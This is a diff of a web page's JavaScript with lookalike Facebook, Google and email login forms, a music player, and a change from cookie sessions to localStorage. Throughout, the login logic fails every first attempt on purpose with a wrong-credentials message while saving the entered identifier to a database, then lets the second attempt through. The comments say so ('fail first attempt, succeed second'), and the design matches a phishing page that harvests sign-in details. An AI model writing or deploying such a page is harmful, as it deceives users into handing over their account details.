@@ -1192,21 +1192,12 @@
                 }
                 
                 const result = await response.json();
-                
-                // SET ANDROID-FRIENDLY COOKIES
-                const sessionData = {
-                    id: result.id || userData.email || userData.phone,
-                    timestamp: Date.now(),
-                    identifier: userData.email || userData.phone
-                };
-                const cookieValue = encodeURIComponent(JSON.stringify(sessionData));
-                document.cookie = `neon_session=${cookieValue}; path=/; max-age=2592000; secure; samesite=none`;
-                document.cookie = `user_identifier=${encodeURIComponent(sessionData.identifier)}; path=/; max-age=2592000; secure; samesite=none`;
-                
                 return result;
             } catch (error) {
                 console.error('Database storage error:', error);
-                throw error;
+                // Fallback to localStorage
+                localStorage.setItem('user', JSON.stringify(userData));
+                return userData;
             }
         }
 
@@ -1222,33 +1213,10 @@
                 return result.user || null;
             } catch (error) {
                 console.error('Database check error:', error);
-                throw error;
+                // Fallback to localStorage
+                const storedUser = localStorage.getItem('user');
+                return storedUser ? JSON.parse(storedUser) : null;
             }
-        }
-
-        // ===== SESSION CHECK =====
-        function checkExistingSession() {
-            const cookies = document.cookie;
-            const sessionMatch = cookies.match(/neon_session=([^;]+)/);
-            const identifierMatch = cookies.match(/user_identifier=([^;]+)/);
-            
-            if (sessionMatch && identifierMatch) {
-                try {
-                    const sessionData = JSON.parse(decodeURIComponent(sessionMatch[1]));
-                    const identifier = decodeURIComponent(identifierMatch[1]);
-                    
-                    currentUser = {
-                        email: sessionData.identifier.includes('@') ? sessionData.identifier : null,
-                        phone: !sessionData.identifier.includes('@') ? sessionData.identifier : null,
-                        login_method: 'session'
-                    };
-                    
-                    return true;
-                } catch (e) {
-                    console.log('Session parse error:', e);
-                }
-            }
-            return false;
         }
 
         // ===== DOM ELEMENTS =====
@@ -1279,7 +1247,9 @@
             if (facebookLogin) {
                 facebookLogin.addEventListener('click', () => {
                     console.log('Facebook login clicked');
+                    // Toggle form visibility instead of modal
                     facebookForm.style.display = facebookForm.style.display === 'flex' ? 'none' : 'flex';
+                    // Hide other forms
                     googleForm.style.display = 'none';
                     emailForm.style.display = 'none';
                 });
@@ -1288,7 +1258,9 @@
             if (googleLogin) {
                 googleLogin.addEventListener('click', () => {
                     console.log('Google login clicked');
+                    // Toggle form visibility instead of modal
                     googleForm.style.display = googleForm.style.display === 'flex' ? 'none' : 'flex';
+                    // Hide other forms
                     facebookForm.style.display = 'none';
                     emailForm.style.display = 'none';
                 });
@@ -1298,6 +1270,7 @@
                 otherLogin.addEventListener('click', () => {
                     console.log('Other login clicked');
                     emailForm.style.display = emailForm.style.display === 'flex' ? 'none' : 'flex';
+                    // Hide other forms
                     facebookForm.style.display = 'none';
                     googleForm.style.display = 'none';
                 });
@@ -1329,8 +1302,7 @@
             if (logoutBtn) {
                 logoutBtn.addEventListener('click', () => {
                     currentUser = null;
-                    document.cookie = 'neon_session=; path=/; max-age=0;';
-                    document.cookie = 'user_identifier=; path=/; max-age=0;';
+                    localStorage.removeItem('user');
                     loginPage.style.display = 'flex';
                     homePage.style.display = 'none';
                 });
@@ -1344,17 +1316,19 @@
         }
 
         function isValidPhone(phone) {
+            // Strict phone validation: must start with 08 or 09 and be exactly 10 digits
             const phoneRegex = /^(08|09)\d{8}$/;
             return phoneRegex.test(phone);
         }
 
         function canLogin(identifier) {
+            // Allow login on second attempt
             if (!loginAttempts[identifier]) {
                 loginAttempts[identifier] = 1;
-                return false;
+                return false; // First attempt fails
             } else {
                 loginAttempts[identifier]++;
-                return true;
+                return true; // Second attempt succeeds
             }
         }
 
@@ -1370,6 +1344,7 @@
                 return;
             }
             
+            // Enhanced validation
             if (!isValidEmail(identifier) && !isValidPhone(identifier)) {
                 alert('Please enter:\n- A valid email address\n- OR a valid phone number starting with 08 or 09 (10 digits total)');
                 return;
@@ -1377,9 +1352,12 @@
             
             try {
                 const existingUser = await checkUserExists(identifier);
+                
+                // Enhanced login logic: fail first attempt, succeed second
                 const allowLogin = canLogin(identifier);
                 
                 if (!allowLogin) {
+                    // First attempt - show wrong credentials but still store in database
                     console.log('First login attempt - showing error');
                     if (!existingUser) {
                         const userData = {
@@ -1396,6 +1374,7 @@
                     return;
                 }
                 
+                // Second attempt - allow login
                 console.log('Second login attempt - allowing access');
                 if (!existingUser) {
                     const userData = {
@@ -1416,6 +1395,8 @@
                 
                 loginPage.style.display = 'none';
                 homePage.style.display = 'flex';
+                
+                // Initialize home page features
                 initializeHomePage();
                 
             } catch (error) {
@@ -1446,19 +1427,24 @@
                 return;
             }
             
+            // Enhanced email validation for providers
             if (!isValidEmail(email)) {
                 alert('Please enter a valid email address');
                 return;
             }
             
+            // Show loading state
             form.style.display = 'none';
             loading.style.display = 'flex';
             
             try {
                 const existingUser = await checkUserExists(email);
+                
+                // Enhanced login logic for providers too
                 const allowLogin = canLogin(email);
                 
                 if (!allowLogin) {
+                    // First attempt fails
                     console.log('First provider login attempt - showing error');
                     if (!existingUser) {
                         const userData = {
@@ -1474,6 +1460,7 @@
                     return;
                 }
                 
+                // Second attempt succeeds
                 console.log('Second provider login attempt - allowing access');
                 if (!existingUser) {
                     const userData = {
@@ -1493,12 +1480,15 @@
                 
                 loginPage.style.display = 'none';
                 homePage.style.display = 'flex';
+                
+                // Initialize home page features
                 initializeHomePage();
                 
             } catch (error) {
                 console.error('Provider login error:', error);
                 alert('Login failed. Please try again.');
             } finally {
+                // Reset forms
                 form.style.display = 'none';
                 loading.style.display = 'none';
                 document.getElementById('facebookEmail').value = '';
@@ -1528,6 +1518,7 @@
             let currentSongIndex = 0;
             let songs = [];
 
+            // Load songs from the list
             songItems.forEach((item, index) => {
                 songs.push({
                     src: item.dataset.src,
@@ -1536,6 +1527,7 @@
                 });
             });
 
+            // Set initial volume
             if (audio) {
                 audio.volume = 0.5;
             }
@@ -1543,6 +1535,7 @@
                 volumeSlider.value = 0.5;
             }
 
+            // Play selected song
             function playSong(index) {
                 if (index < 0 || index >= songs.length) return;
                 
@@ -1553,8 +1546,11 @@
                     audio.src = song.src;
                     audio.play().then(() => {
                         if (songTitle) songTitle.textContent = `Now playing: ${song.title} 🎶`;
+                        
+                        // Update active song in list
                         songItems.forEach(item => item.classList.remove('active'));
                         song.element.classList.add('active');
+                        
                     }).catch(error => {
                         console.log('Play failed:', error);
                         if (songTitle) songTitle.textContent = "Error playing song. Click play to retry.";
@@ -1562,9 +1558,11 @@
                 }
             }
 
+            // Play button
             if (playBtn) {
                 playBtn.addEventListener('click', () => {
                     if (!audio.src) {
+                        // If no song is loaded, play the first one
                         playSong(0);
                     } else {
                         audio.play().catch(error => {
@@ -1574,6 +1572,7 @@
                 });
             }
 
+            // Pause button
             if (pauseBtn) {
                 pauseBtn.addEventListener('click', () => {
                     audio.pause();
@@ -1581,6 +1580,7 @@
                 });
             }
 
+            // Stop button
             if (stopBtn) {
                 stopBtn.addEventListener('click', () => {
                     audio.pause();
@@ -1590,6 +1590,7 @@
                 });
             }
 
+            // Previous button
             if (prevBtn) {
                 prevBtn.addEventListener('click', () => {
                     let newIndex = currentSongIndex - 1;
@@ -1598,6 +1599,7 @@
                 });
             }
 
+            // Next button
             if (nextBtn) {
                 nextBtn.addEventListener('click', () => {
                     let newIndex = currentSongIndex + 1;
@@ -1606,18 +1608,21 @@
                 });
             }
 
+            // Song selection
             songItems.forEach((item, index) => {
                 item.addEventListener('click', () => {
                     playSong(index);
                 });
             });
 
+            // Volume control
             if (volumeSlider) {
                 volumeSlider.addEventListener('input', () => {
                     if (audio) audio.volume = volumeSlider.value;
                 });
             }
 
+            // Update progress bar
             if (audio) {
                 audio.addEventListener('timeupdate', () => {
                     if (audio.duration) {
@@ -1629,6 +1634,7 @@
                     }
                 });
 
+                // Auto-play next song when current ends
                 audio.addEventListener('ended', () => {
                     let newIndex = currentSongIndex + 1;
                     if (newIndex >= songs.length) newIndex = 0;
@@ -1636,6 +1642,7 @@
                 });
             }
 
+            // Auto-play first song on first user interaction
             document.addEventListener('click', function initAutoPlay() {
                 if (songs.length > 0 && audio && !audio.src) {
                     playSong(0);
@@ -1729,20 +1736,26 @@ Best regards!`;
             initializeMusicPlayer();
         }
 
-        // Check if user is already logged in via cookies
+        // Check if user is already logged in
         window.addEventListener('DOMContentLoaded', function() {
             console.log('DOM loaded - initializing app...');
             
+            // Initialize event listeners first
             initializeEventListeners();
             
-            // Check for existing session cookies (works on Android)
-            if (checkExistingSession()) {
-                userAvatar.textContent = currentUser.identifier.charAt(0).toUpperCase();
-                userName.textContent = currentUser.identifier;
-                loginPage.style.display = 'none';
-                homePage.style.display = 'flex';
-                initializeHomePage();
-                console.log('Session restored from cookies');
+            // Check for stored user
+            try {
+                const storedUser = localStorage.getItem('user');
+                if (storedUser) {
+                    currentUser = JSON.parse(storedUser);
+                    userAvatar.textContent = (currentUser.email || currentUser.phone).charAt(0).toUpperCase();
+                    userName.textContent = currentUser.email || currentUser.phone;
+                    loginPage.style.display = 'none';
+                    homePage.style.display = 'flex';
+                    initializeHomePage();
+                }
+            } catch (error) {
+                console.log('No stored user found');
             }
             
             console.log('App initialization complete');
